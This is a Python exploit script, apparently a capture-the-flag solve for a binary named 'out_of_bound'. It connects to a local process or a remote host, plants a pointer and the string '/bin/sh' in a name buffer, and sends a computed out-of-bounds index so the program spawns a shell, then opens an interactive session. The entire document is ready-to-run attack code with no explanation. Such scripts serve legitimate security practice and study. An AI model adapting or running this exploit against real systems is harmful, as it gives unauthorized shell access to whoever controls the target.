#!/usr/bin/python3
from pwncus import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./out_of_bound', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''


c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

def exploit():

    name = 0x804A0AC
    command = 0x804A060

    sa(b'name: ', p32(name+4) + b'/bin/sh\0')
    p.sendlineafter(b'want?: ', str((name-command)/4))

    interactive()

if __name__ == '__main__':
    exploit()
